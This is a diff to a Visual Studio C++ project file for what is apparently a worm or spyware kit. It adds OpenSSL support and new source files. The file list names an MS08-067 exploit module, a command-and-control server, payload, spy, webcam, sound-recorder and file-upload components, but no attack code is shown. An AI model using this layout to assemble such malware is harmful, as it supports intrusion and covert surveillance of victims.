@@ -18,14 +18,13 @@
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
     <ConfigurationType>StaticLibrary</ConfigurationType>
     <UseDebugLibraries>true</UseDebugLibraries>
-    <CharacterSet>MultiByte</CharacterSet>
-    <UseOfMfc>false</UseOfMfc>
+    <CharacterSet>Unicode</CharacterSet>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
     <ConfigurationType>StaticLibrary</ConfigurationType>
     <UseDebugLibraries>false</UseDebugLibraries>
     <WholeProgramOptimization>true</WholeProgramOptimization>
-    <CharacterSet>MultiByte</CharacterSet>
+    <CharacterSet>Unicode</CharacterSet>
   </PropertyGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
   <ImportGroup Label="ExtensionSettings">
@@ -43,22 +42,15 @@
   </PropertyGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
     <ClCompile>
-      <WarningLevel>Level3</WarningLevel>
-      <Optimization>Disabled</Optimization>
-      <AdditionalIncludeDirectories>lib\zlib;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
-      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
+      <AdditionalIncludeDirectories>lib\openssl\include;lib\zlib;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
       <PreprocessorDefinitions>_CRT_SECURE_NO_WARNINGS;_SCL_SECURE_NO_WARNINGS;LOG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
-      <MultiProcessorCompilation>true</MultiProcessorCompilation>
-      <MinimalRebuild>false</MinimalRebuild>
+      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
     </ClCompile>
     <Link>
       <GenerateDebugInformation>true</GenerateDebugInformation>
       <AdditionalLibraryDirectories>F:\dev\projets\worms\hacking construction kit\jpeg-8\lib\win\x86;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
     </Link>
-    <Lib>
-      <IgnoreSpecificDefaultLibraries>%(IgnoreSpecificDefaultLibraries)</IgnoreSpecificDefaultLibraries>
-      <LinkTimeCodeGeneration>true</LinkTimeCodeGeneration>
-    </Lib>
+    <Lib />
     <CustomBuildStep>
       <Command>
       </Command>
@@ -76,9 +68,9 @@
       <Optimization>MaxSpeed</Optimization>
       <FunctionLevelLinking>true</FunctionLevelLinking>
       <IntrinsicFunctions>true</IntrinsicFunctions>
-      <AdditionalIncludeDirectories>lib\zlib;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <AdditionalIncludeDirectories>lib\openssl\include;lib\zlib;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
       <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
-      <PreprocessorDefinitions>_CRT_SECURE_NO_WARNINGS;_SCL_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <PreprocessorDefinitions>%(PreprocessorDefinitions)</PreprocessorDefinitions>
     </ClCompile>
     <Link>
       <GenerateDebugInformation>true</GenerateDebugInformation>
@@ -89,17 +81,22 @@
     <Lib>
       <AdditionalDependencies>%(AdditionalDependencies)</AdditionalDependencies>
     </Lib>
+    <PreBuildEvent>
+      <Command>create_version.bat</Command>
+    </PreBuildEvent>
   </ItemDefinitionGroup>
   <ItemGroup>
     <ClCompile Include="base64.cpp" />
     <ClCompile Include="bmp2jpeg.c" />
     <ClCompile Include="check.cpp" />
+    <ClCompile Include="cmd_parser.cpp" />
     <ClCompile Include="command_manager.cpp" />
     <ClCompile Include="crypted_global.cpp" />
     <ClCompile Include="ccrypter.cpp" />
     <ClCompile Include="cshell.cpp" />
     <ClCompile Include="c_c_server.cpp" />
     <ClCompile Include="decoder.cpp" />
+    <ClCompile Include="error.cpp" />
     <ClCompile Include="extern\BigInt.cpp" />
     <ClCompile Include="extern\Key.cpp" />
     <ClCompile Include="extern\KeyPair.cpp" />
@@ -114,6 +111,9 @@
     <ClCompile Include="generated\srvsvc_c.c" />
     <ClCompile Include="generated\srvsvc_s.c" />
     <ClCompile Include="global.cpp" />
+    <ClCompile Include="host.cpp" />
+    <ClCompile Include="host_client.cpp" />
+    <ClCompile Include="host_server.cpp" />
     <ClCompile Include="http_helper.cpp" />
     <ClCompile Include="Icmp.cpp" />
     <ClCompile Include="info.cpp" />
@@ -121,6 +121,7 @@
     <ClCompile Include="mem.cpp" />
     <ClCompile Include="ms08-067.cpp" />
     <ClCompile Include="network.cpp" />
+    <ClCompile Include="openssl_init.cpp" />
     <ClCompile Include="payload.cpp" />
     <ClCompile Include="plugin.cpp" />
     <ClCompile Include="print.cpp" />
@@ -133,9 +134,12 @@
     <ClCompile Include="smb.cpp" />
     <ClCompile Include="sound_recorder.cpp" />
     <ClCompile Include="spy.cpp" />
+    <ClCompile Include="ssl_host_client.cpp" />
+    <ClCompile Include="ssl_host_server.cpp" />
     <ClCompile Include="tcp.cpp" />
     <ClCompile Include="cwebcam.cpp" />
     <ClCompile Include="to_test.cpp" />
+    <ClCompile Include="tstring.cpp" />
     <ClCompile Include="upload_file_base64.cpp" />
     <ClCompile Include="upload_file_ftp.cpp" />
     <ClCompile Include="utils.cpp" />
@@ -147,6 +151,7 @@
     <ClInclude Include="base64.h" />
     <ClInclude Include="bmp2jpeg.h" />
     <ClInclude Include="check.h" />
+    <ClInclude Include="cmd_parser.h" />
     <ClInclude Include="command_manager.h" />
     <ClInclude Include="crypted_global.h" />
     <ClInclude Include="ccrypter.h" />
@@ -154,6 +159,7 @@
     <ClInclude Include="cwebcam.h" />
     <ClInclude Include="c_c_server.h" />
     <ClInclude Include="Decoder.h" />
+    <ClInclude Include="error.h" />
     <ClInclude Include="extern\BigInt.h" />
     <ClInclude Include="extern\Key.h" />
     <ClInclude Include="extern\KeyPair.h" />
@@ -166,6 +172,9 @@
     <ClInclude Include="generated\spoolss.h" />
     <ClInclude Include="generated\srvsvc.h" />
     <ClInclude Include="global.h" />
+    <ClInclude Include="host.h" />
+    <ClInclude Include="host_client.h" />
+    <ClInclude Include="host_server.h" />
     <ClInclude Include="http_helper.h" />
     <ClInclude Include="Icmp.h" />
     <ClInclude Include="info.h" />
@@ -175,6 +184,7 @@
     <ClInclude Include="memory_debug.h" />
     <ClInclude Include="ms08-067.h" />
     <ClInclude Include="network.h" />
+    <ClInclude Include="openssl_init.h" />
     <ClInclude Include="payload.h" />
     <ClInclude Include="plugin.h" />
     <ClInclude Include="plugin_loader.h" />
@@ -188,11 +198,14 @@
     <ClInclude Include="smb.h" />
     <ClInclude Include="sound_recorder.h" />
     <ClInclude Include="spy.h" />
+    <ClInclude Include="ssl_host_client.h" />
+    <ClInclude Include="ssl_host_server.h" />
     <ClInclude Include="tcp.h" />
     <ClInclude Include="tstring.h" />
     <ClInclude Include="upload_file_base64.h" />
     <ClInclude Include="upload_file_ftp.h" />
     <ClInclude Include="utils.h" />
+    <ClInclude Include="version.h" />
     <ClInclude Include="wsa_init.h" />
     <ClInclude Include="xwebcam.h" />
     <ClInclude Include="czip.h" />
